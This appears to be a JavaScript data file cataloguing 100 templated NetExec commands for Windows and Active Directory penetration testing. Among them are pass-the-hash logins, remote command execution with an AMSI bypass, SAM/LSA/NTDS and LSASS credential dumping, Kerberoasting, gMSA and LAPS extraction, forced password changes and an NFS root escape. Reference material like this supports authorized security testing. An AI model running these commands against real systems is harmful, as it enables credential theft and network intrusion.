// Complete NetExec Commands Database - All protocols and modules
const NETEXEC_COMMANDS = {
  "SMB Authentication": [
    { id: 1, name: "Basic SMB Authentication", command: "netexec smb {ip} -u {username} -p {password}", description: "Test credentials against SMB service", category: "SMB Authentication" },
    { id: 2, name: "Null Session Test", command: "netexec smb {ip} -u '' -p ''", description: "Test null session access", category: "SMB Authentication" },
    { id: 3, name: "Guest Session Test", command: "netexec smb {ip} -u 'guest' -p ''", description: "Test guest session access", category: "SMB Authentication" },
    { id: 4, name: "Local Authentication", command: "netexec smb {ip} -u {username} -p {password} --local-auth", description: "Perform local authentication", category: "SMB Authentication" },
    { id: 5, name: "Hash Authentication", command: "netexec smb {ip} -u {username} -H {hash}", description: "Authenticate using NTLM hash", category: "SMB Authentication" },
    { id: 6, name: "Kerberos Authentication", command: "netexec smb {ip} -u {username} -p {password} -k", description: "Use Kerberos authentication", category: "SMB Authentication" },
    { id: 7, name: "Domain Authentication", command: "netexec smb {ip} -u {username} -p {password} -d {domain}", description: "Authenticate with specific domain", category: "SMB Authentication" }
  ],
  "SMB Enumeration": [
    { id: 8, name: "Basic Host Enumeration", command: "netexec smb {ip}", description: "Basic SMB host enumeration", category: "SMB Enumeration" },
    { id: 9, name: "Share Enumeration", command: "netexec smb {ip} -u {username} -p {password} --shares", description: "Enumerate SMB shares", category: "SMB Enumeration" },
    { id: 10, name: "User Enumeration", command: "netexec smb {ip} -u {username} -p {password} --users", description: "Enumerate domain users", category: "SMB Enumeration" },
    { id: 11, name: "Group Enumeration", command: "netexec smb {ip} -u {username} -p {password} --groups", description: "Enumerate domain groups", category: "SMB Enumeration" },
    { id: 12, name: "Local Group Enumeration", command: "netexec smb {ip} -u {username} -p {password} --local-groups", description: "Enumerate local groups", category: "SMB Enumeration" },
    { id: 13, name: "Logged-on Users", command: "netexec smb {ip} -u {username} -p {password} --loggedon-users", description: "Enumerate logged-on users", category: "SMB Enumeration" },
    { id: 14, name: "Password Policy", command: "netexec smb {ip} -u {username} -p {password} --pass-pol", description: "Enumerate password policy", category: "SMB Enumeration" },
    { id: 15, name: "RID Brute Force", command: "netexec smb {ip} -u {username} -p {password} --rid-brute", description: "Brute force RID cycling", category: "SMB Enumeration" },
    { id: 16, name: "Sessions Enumeration", command: "netexec smb {ip} -u {username} -p {password} --sessions", description: "Enumerate active sessions", category: "SMB Enumeration" },
    { id: 17, name: "Disk Enumeration", command: "netexec smb {ip} -u {username} -p {password} --disks", description: "Enumerate available disks", category: "SMB Enumeration" },
    { id: 18, name: "Computer Enumeration", command: "netexec smb {ip} -u {username} -p {password} --computers", description: "Enumerate domain computers", category: "SMB Enumeration" },
    { id: 19, name: "All-in-One Enumeration", command: "netexec smb {ip} -u {username} -p {password} --shares --users --groups --local-groups --loggedon-users --rid-brute --sessions --pass-pol", description: "Comprehensive SMB enumeration", category: "SMB Enumeration" }
  ],
  "SMB Command Execution": [
    { id: 20, name: "Execute CMD Command", command: "netexec smb {ip} -u {username} -p {password} -x 'whoami'", description: "Execute Windows command", category: "SMB Command Execution" },
    { id: 21, name: "Execute PowerShell", command: "netexec smb {ip} -u {username} -p {password} -X '$PSVersionTable'", description: "Execute PowerShell command", category: "SMB Command Execution" },
    { id: 22, name: "WMI Execution Method", command: "netexec smb {ip} -u {username} -p {password} -x 'whoami' --exec-method wmiexec", description: "Execute via WMI", category: "SMB Command Execution" },
    { id: 23, name: "AT Execution Method", command: "netexec smb {ip} -u {username} -p {password} -x 'whoami' --exec-method atexec", description: "Execute via AT scheduler", category: "SMB Command Execution" },
    { id: 24, name: "SMB Execution Method", command: "netexec smb {ip} -u {username} -p {password} -x 'whoami' --exec-method smbexec", description: "Execute via SMB service", category: "SMB Command Execution" },
    { id: 25, name: "PowerShell with AMSI Bypass", command: "netexec smb {ip} -u {username} -p {password} -X '$PSVersionTable' --amsi-bypass", description: "Execute PowerShell with AMSI bypass", category: "SMB Command Execution" }
  ],
  "SMB Credential Dumping": [
    { id: 26, name: "Dump SAM Database", command: "netexec smb {ip} -u {username} -p {password} --sam", description: "Dump local SAM database", category: "SMB Credential Dumping" },
    { id: 27, name: "Dump LSA Secrets", command: "netexec smb {ip} -u {username} -p {password} --lsa", description: "Dump LSA secrets", category: "SMB Credential Dumping" },
    { id: 28, name: "Dump NTDS Database", command: "netexec smb {ip} -u {username} -p {password} --ntds", description: "Dump NTDS.dit database", category: "SMB Credential Dumping" },
    { id: 29, name: "Dump NTDS via VSS", command: "netexec smb {ip} -u {username} -p {password} --ntds vss", description: "Dump NTDS via Volume Shadow Copy", category: "SMB Credential Dumping" },
    { id: 30, name: "Extract LAPS Passwords", command: "netexec smb {ip} -u {username} -p {password} --laps", description: "Extract LAPS passwords", category: "SMB Credential Dumping" },
    { id: 31, name: "DPAPI Extraction", command: "netexec smb {ip} -u {username} -p {password} --dpapi", description: "Extract DPAPI credentials", category: "SMB Credential Dumping" }
  ],
  "SMB File Operations": [
    { id: 32, name: "Spider Shares", command: "netexec smb {ip} -u {username} -p {password} -M spider_plus", description: "Spider network shares", category: "SMB File Operations" },
    { id: 33, name: "Spider and Download", command: "netexec smb {ip} -u {username} -p {password} -M spider_plus -o READ_ONLY=false", description: "Spider and download files", category: "SMB File Operations" },
    { id: 34, name: "Get File", command: "netexec smb {ip} -u {username} -p {password} --get-file C:\\temp\\file.txt ./downloaded_file.txt", description: "Download file from target", category: "SMB File Operations" },
    { id: 35, name: "Put File", command: "netexec smb {ip} -u {username} -p {password} --put-file ./local_file.txt C:\\temp\\uploaded_file.txt", description: "Upload file to target", category: "SMB File Operations" }
  ],
  "SMB Advanced Modules": [
    { id: 36, name: "Mimikatz (lsassy)", command: "netexec smb {ip} -u {username} -p {password} -M lsassy", description: "Extract credentials with lsassy", category: "SMB Advanced Modules" },
    { id: 37, name: "Nanodump", command: "netexec smb {ip} -u {username} -p {password} -M nanodump", description: "Dump LSASS with nanodump", category: "SMB Advanced Modules" },
    { id: 38, name: "Enum Antivirus", command: "netexec smb {ip} -u {username} -p {password} -M enum_av", description: "Enumerate antivirus products", category: "SMB Advanced Modules" },
    { id: 39, name: "WebDAV Check", command: "netexec smb {ip} -u {username} -p {password} -M webdav", description: "Check WebClient service", category: "SMB Advanced Modules" },
    { id: 40, name: "Veeam Credentials", command: "netexec smb {ip} -u {username} -p {password} -M veeam", description: "Extract Veeam credentials", category: "SMB Advanced Modules" },
    { id: 41, name: "Coercion Vulnerabilities", command: "netexec smb {ip} -u {username} -p {password} -M coerce_plus -o LISTENER={ip}", description: "Check coercion vulnerabilities", category: "SMB Advanced Modules" },
    { id: 42, name: "GPP Password", command: "netexec smb {ip} -u {username} -p {password} -M gpp_password", description: "Extract Group Policy Preferences passwords", category: "SMB Advanced Modules" },
    { id: 43, name: "Zerologon Check", command: "netexec smb {ip} -u {username} -p {password} -M zerologon", description: "Check for Zerologon vulnerability", category: "SMB Advanced Modules" },
    { id: 44, name: "PetitPotam Check", command: "netexec smb {ip} -u {username} -p {password} -M petitpotam", description: "Check for PetitPotam vulnerability", category: "SMB Advanced Modules" },
    { id: 45, name: "Change Password", command: "netexec smb {ip} -u {username} -p {password} -M change-password -o USER='target_user' NEWPASS='new_password'", description: "Change user password", category: "SMB Advanced Modules" }
  ],
  "LDAP Authentication": [
    { id: 46, name: "LDAP Authentication", command: "netexec ldap {ip} -u {username} -p {password}", description: "Test LDAP authentication", category: "LDAP Authentication" },
    { id: 47, name: "LDAP Hash Authentication", command: "netexec ldap {ip} -u {username} -H {hash}", description: "LDAP authentication with hash", category: "LDAP Authentication" },
    { id: 48, name: "LDAP Kerberos Auth", command: "netexec ldap {ip} -u {username} -p {password} -k", description: "LDAP Kerberos authentication", category: "LDAP Authentication" },
    { id: 49, name: "LDAP No SMB", command: "netexec ldap {ip} -u {username} -p {password} --no-smb", description: "LDAP without SMB connection", category: "LDAP Authentication" }
  ],
  "LDAP Enumeration": [
    { id: 50, name: "LDAP Users", command: "netexec ldap {ip} -u {username} -p {password} --users", description: "Enumerate domain users via LDAP", category: "LDAP Enumeration" },
    { id: 51, name: "LDAP Groups", command: "netexec ldap {ip} -u {username} -p {password} --groups", description: "Enumerate domain groups via LDAP", category: "LDAP Enumeration" },
    { id: 52, name: "LDAP Computers", command: "netexec ldap {ip} -u {username} -p {password} --computers", description: "Enumerate domain computers", category: "LDAP Enumeration" },
    { id: 53, name: "Admin Count", command: "netexec ldap {ip} -u {username} -p {password} --admin-count", description: "Find accounts with adminCount=1", category: "LDAP Enumeration" },
    { id: 54, name: "User Descriptions", command: "netexec ldap {ip} -u {username} -p {password} --description", description: "Get user descriptions", category: "LDAP Enumeration" },
    { id: 55, name: "Password Not Required", command: "netexec ldap {ip} -u {username} -p {password} --password-not-required", description: "Find accounts with password not required", category: "LDAP Enumeration" },
    { id: 56, name: "Trusted for Delegation", command: "netexec ldap {ip} -u {username} -p {password} --trusted-for-delegation", description: "Find delegation trusted accounts", category: "LDAP Enumeration" },
    { id: 57, name: "Machine Account Quota", command: "netexec ldap {ip} -u {username} -p {password} -M maq", description: "Check machine account quota", category: "LDAP Enumeration" },
    { id: 58, name: "Domain SID", command: "netexec ldap {ip} -u {username} -p {password} --domain-sid", description: "Get domain SID", category: "LDAP Enumeration" }
  ],
  "LDAP Attacks": [
    { id: 59, name: "ASREPRoast", command: "netexec ldap {ip} -u {username} -p {password} --asreproast asrep_hashes.txt", description: "Perform ASREPRoast attack", category: "LDAP Attacks" },
    { id: 60, name: "Kerberoasting", command: "netexec ldap {ip} -u {username} -p {password} --kerberoasting kerberoast_hashes.txt", description: "Perform Kerberoasting attack", category: "LDAP Attacks" },
    { id: 61, name: "Unconstrained Delegation", command: "netexec ldap {ip} -u {username} -p {password} --unconstrained", description: "Find unconstrained delegation", category: "LDAP Attacks" },
    { id: 62, name: "Constrained Delegation", command: "netexec ldap {ip} -u {username} -p {password} --constrained", description: "Find constrained delegation", category: "LDAP Attacks" },
    { id: 63, name: "RBCD", command: "netexec ldap {ip} -u {username} -p {password} --rbcd", description: "Find resource-based constrained delegation", category: "LDAP Attacks" }
  ],
  "LDAP Advanced": [
    { id: 64, name: "BloodHound Collection", command: "netexec ldap {ip} -u {username} -p {password} --bloodhound --dns-server {ip} -c all", description: "Collect BloodHound data", category: "LDAP Advanced" },
    { id: 65, name: "gMSA Dump", command: "netexec ldap {ip} -u {username} -p {password} --gmsa", description: "Dump gMSA passwords", category: "LDAP Advanced" },
    { id: 66, name: "ADCS Enumeration", command: "netexec ldap {ip} -u {username} -p {password} -M adcs", description: "Enumerate ADCS templates", category: "LDAP Advanced" },
    { id: 67, name: "Pre2k Computers", command: "netexec ldap {ip} -u {username} -p {password} -M pre2k", description: "Find pre-Windows 2000 computers", category: "LDAP Advanced" },
    { id: 68, name: "LDAP Signing Check", command: "netexec ldap {ip} -u {username} -p {password} --ldap-signing", description: "Check LDAP signing requirements", category: "LDAP Advanced" },
    { id: 69, name: "Extract Subnets", command: "netexec ldap {ip} -u {username} -p {password} --subnets", description: "Extract subnet information", category: "LDAP Advanced" },
    { id: 70, name: "Enumerate Trusts", command: "netexec ldap {ip} -u {username} -p {password} --trusts", description: "Enumerate domain trusts", category: "LDAP Advanced" }
  ],
  "WinRM Operations": [
    { id: 71, name: "WinRM Authentication", command: "netexec winrm {ip} -u {username} -p {password}", description: "Test WinRM authentication", category: "WinRM Operations" },
    { id: 72, name: "WinRM with Domain", command: "netexec winrm {ip} -u {username} -p {password} -d {domain}", description: "WinRM with domain authentication", category: "WinRM Operations" },
    { id: 73, name: "WinRM Hash Auth", command: "netexec winrm {ip} -u {username} -H {hash}", description: "WinRM authentication with hash", category: "WinRM Operations" },
    { id: 74, name: "WinRM Command Execution", command: "netexec winrm {ip} -u {username} -p {password} -x 'whoami'", description: "Execute command via WinRM", category: "WinRM Operations" },
    { id: 75, name: "WinRM PowerShell", command: "netexec winrm {ip} -u {username} -p {password} -X '$env:COMPUTERNAME'", description: "Execute PowerShell via WinRM", category: "WinRM Operations" }
  ],
  "MSSQL Operations": [
    { id: 76, name: "MSSQL Authentication", command: "netexec mssql {ip} -u {username} -p {password}", description: "Test MSSQL authentication", category: "MSSQL Operations" },
    { id: 77, name: "MSSQL Windows Auth", command: "netexec mssql {ip} -u {username} -p {password} --windows-auth", description: "MSSQL Windows authentication", category: "MSSQL Operations" },
    { id: 78, name: "MSSQL Command Execution", command: "netexec mssql {ip} -u {username} -p {password} -x 'whoami'", description: "Execute command via xp_cmdshell", category: "MSSQL Operations" },
    { id: 79, name: "MSSQL File Upload", command: "netexec mssql {ip} -u {username} -p {password} --put-file ./local.txt C:\\temp\\remote.txt", description: "Upload file via MSSQL", category: "MSSQL Operations" },
    { id: 80, name: "MSSQL File Download", command: "netexec mssql {ip} -u {username} -p {password} --get-file C:\\temp\\file.txt ./downloaded.txt", description: "Download file via MSSQL", category: "MSSQL Operations" }
  ],
  "SSH Operations": [
    { id: 81, name: "SSH Authentication", command: "netexec ssh {ip} -u {username} -p {password}", description: "Test SSH authentication", category: "SSH Operations" },
    { id: 82, name: "SSH Key Authentication", command: "netexec ssh {ip} -u {username} --key-file ./id_rsa", description: "SSH authentication with key", category: "SSH Operations" },
    { id: 83, name: "SSH Command Execution", command: "netexec ssh {ip} -u {username} -p {password} -x 'whoami'", description: "Execute command via SSH", category: "SSH Operations" },
    { id: 84, name: "SSH File Upload", command: "netexec ssh {ip} -u {username} -p {password} --put-file ./local.txt /tmp/remote.txt", description: "Upload file via SSH", category: "SSH Operations" },
    { id: 85, name: "SSH File Download", command: "netexec ssh {ip} -u {username} -p {password} --get-file /etc/passwd ./passwd.txt", description: "Download file via SSH", category: "SSH Operations" }
  ],
  "FTP Operations": [
    { id: 86, name: "FTP Authentication", command: "netexec ftp {ip} -u {username} -p {password}", description: "Test FTP authentication", category: "FTP Operations" },
    { id: 87, name: "FTP Anonymous", command: "netexec ftp {ip} -u 'anonymous' -p ''", description: "Test FTP anonymous access", category: "FTP Operations" },
    { id: 88, name: "FTP List Files", command: "netexec ftp {ip} -u {username} -p {password} --ls", description: "List FTP directory contents", category: "FTP Operations" },
    { id: 89, name: "FTP Download File", command: "netexec ftp {ip} -u {username} -p {password} --get filename", description: "Download file via FTP", category: "FTP Operations" },
    { id: 90, name: "FTP Upload File", command: "netexec ftp {ip} -u {username} -p {password} --put ./local_file.txt", description: "Upload file via FTP", category: "FTP Operations" }
  ],
  "RDP Operations": [
    { id: 91, name: "RDP Authentication", command: "netexec rdp {ip} -u {username} -p {password}", description: "Test RDP authentication", category: "RDP Operations" },
    { id: 92, name: "RDP Screenshot", command: "netexec rdp {ip} -u {username} -p {password} --screenshot", description: "Take RDP screenshot", category: "RDP Operations" },
    { id: 93, name: "RDP NLA Bypass Screenshot", command: "netexec rdp {ip} --nla-screenshot", description: "Screenshot without NLA", category: "RDP Operations" }
  ],
  "WMI Operations": [
    { id: 94, name: "WMI Authentication", command: "netexec wmi {ip} -u {username} -p {password}", description: "Test WMI authentication", category: "WMI Operations" },
    { id: 95, name: "WMI Local Auth", command: "netexec wmi {ip} -u {username} -p {password} --local-auth", description: "WMI local authentication", category: "WMI Operations" },
    { id: 96, name: "WMI Command Execution", command: "netexec wmi {ip} -u {username} -p {password} -x 'whoami'", description: "Execute command via WMI", category: "WMI Operations" }
  ],
  "NFS Operations": [
    { id: 97, name: "NFS Enumeration", command: "netexec nfs {ip}", description: "Enumerate NFS shares", category: "NFS Operations" },
    { id: 98, name: "NFS Download", command: "netexec nfs {ip} --get-file /path/to/remote/file ./local_file", description: "Download file from NFS", category: "NFS Operations" },
    { id: 99, name: "NFS Upload", command: "netexec nfs {ip} --put-file ./local_file /path/to/remote/file", description: "Upload file to NFS", category: "NFS Operations" },
    { id: 100, name: "NFS Root Escape", command: "netexec nfs {ip} --mount /mnt/nfs --escape", description: "Escape to root filesystem", category: "NFS Operations" }
  ]
};